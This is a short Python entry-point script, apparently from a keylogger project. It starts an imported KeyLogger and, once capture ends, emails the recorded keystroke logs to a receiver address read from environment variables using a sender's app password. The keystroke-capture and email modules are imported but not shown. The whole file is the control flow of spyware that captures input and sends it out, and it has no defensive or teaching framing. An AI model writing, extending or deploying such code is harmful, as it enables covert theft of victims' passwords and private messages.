import os
from dotenv import load_dotenv
from logger.keylogger import KeyLogger
from storage.email_handler import send_email_log

load_dotenv()

def main():
    keylogger = KeyLogger()
    keylogger.start()
    print("\n[*] Keylogger stopped. Sending logs via email.")
    sender_email = os.getenv("SENDER_EMAIL")
    password = os.getenv("APP_PASSWORD")
    receiver_email = os.getenv("RECEIVER_EMAIL")
    send_email_log(sender_email, password, receiver_email)
    print("Email sending process completed.")

if __name__ == "__main__":
    main()